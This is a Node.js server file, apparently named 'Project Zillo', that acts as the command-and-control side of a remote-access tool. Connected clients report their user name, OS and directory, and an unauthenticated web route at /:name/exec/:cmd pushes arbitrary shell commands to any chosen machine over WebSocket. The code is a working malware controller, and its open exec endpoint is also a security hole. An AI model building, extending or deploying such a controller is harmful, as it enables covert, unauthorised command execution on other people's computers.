// WebSocket
const WebSocket = require("ws");
let server = require("http").createServer();

// Express
const express = require("express")
const app = express()
const port = 6969

let clients = {}

app.get("/", (req, res) => {
    var list = "";

    Object.keys(clients).forEach(function(client) {
        var c = clients[client];
        list += `
            Name: ${client}<br>
            OS: ${c.os}<br>
            Path: ${c.path}<br><br>
        `
    })

    res.send(list);
})

app.get("/:name/exec/:cmd", (req, res) => {
    let name = req.params.name;
    let cmd = req.params.cmd;

    let client = clients[name];
    if (client) {
        res.send("Sending command (" + cmd + ") to " + name);

        let instruction = JSON.stringify({
            type: "exec",
            value: cmd,
        })

        client.socket.send(instruction)
    }
})

const wss = new WebSocket.Server({
    server: server,
    perMessageDeflate: false
});

server.on("request", app);

wss.on("connection", function(ws, req) {
    console.log("Connected with " + ws._socket.remoteAddress);

    ws.on("message", function(message) {
        let json = JSON.parse(message)

        if (json) {
            let type = json.type;
            if (type == "connection") {
                console.log(json);

                let name = json.user;
                let os = json.os;
                let path = json.dir;

                clients[name] = {
                    os: os,
                    path: path,
                    socket: ws,
                }
            } else if (type == "result") {
                console.log(json);
            } else {
                console.log("Couldnt format JSON");
                console.log(json);
            }
        } else {
            console.log("Not succesful JSON");
            console.log(message);
        }
    })
});

server.listen(port, function() {
    console.log("Project Zillo initiated");
});